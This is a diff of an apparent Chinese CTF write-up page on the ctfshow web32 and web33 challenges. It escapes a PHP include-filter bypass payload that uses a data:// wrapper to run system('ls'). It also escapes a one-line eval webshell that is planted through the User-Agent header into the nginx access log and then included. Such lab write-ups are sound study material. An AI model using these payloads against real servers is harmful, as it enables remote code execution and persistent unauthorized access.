@@ -30,7 +30,7 @@
 <meta property="og:image" content="http://maskobito.github.io/images/%E8%9A%81%E5%89%911.png">
 <meta property="og:image" content="http://maskobito.github.io/images/%E8%9A%81%E5%89%912.png">
 <meta property="article:published_time" content="2025-06-09T15:00:01.000Z">
-<meta property="article:modified_time" content="2025-07-04T10:35:13.493Z">
+<meta property="article:modified_time" content="2025-07-04T11:07:16.356Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://maskobito.github.io/images/web33.png">
@@ -369,7 +369,7 @@
 </ul>
 </li>
 </ul>
-<p>payload：url&#x2F;?c&#x3D;include $_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('ls'); ?></p>
+<p>payload：<code>url/?c=include $_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&#39;ls&#39;); ?&gt;</code></p>
 <p>区别在于<code>1</code>参数的值：</p>
 <ul>
 <li>失败案例：纯字符串 <code>system(&#39;ls&#39;);</code></li>
@@ -395,7 +395,7 @@
 <li>解码数据流：<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code></li>
 <li><strong>执行其中的PHP代码</strong> → 运行<code>system(&#39;ls&#39;)</code></li>
 </ol>
-<p>绕过后的payload:url&#x2F;?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;,<?php system('ls'); ?></p>
+<p>绕过后的payload:<code>url/?c=include%0a$_GET[1]?&gt;&amp;1=data://text/plain/,&lt;?php system(&#39;ls&#39;); ?&gt;</code></p>
 <h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><p>同web32，重点再写一遍<strong>一句话木马</strong>，并尝试用蚁剑连接。</p>
 <p><img src="/images/web33.png" srcset="/img/loading.gif" lazyload></p>
 <ol>
@@ -405,7 +405,7 @@
 </li>
 <li><p>抓包</p>
 </li>
-<li><p>UA头加上**<?php @eval($_POST['shell']); ?>**</p>
+<li><p>UA头加上**<code>&lt;?php @eval($_POST[&#39;shell&#39;]); ?&gt;</code>**</p>
 </li>
 <li><p>index.php改为实际路径，如&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，即</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=/<span class="hljs-keyword">var</span>/log/nginx/access.log<br></code></pre></td></tr></table></figure>
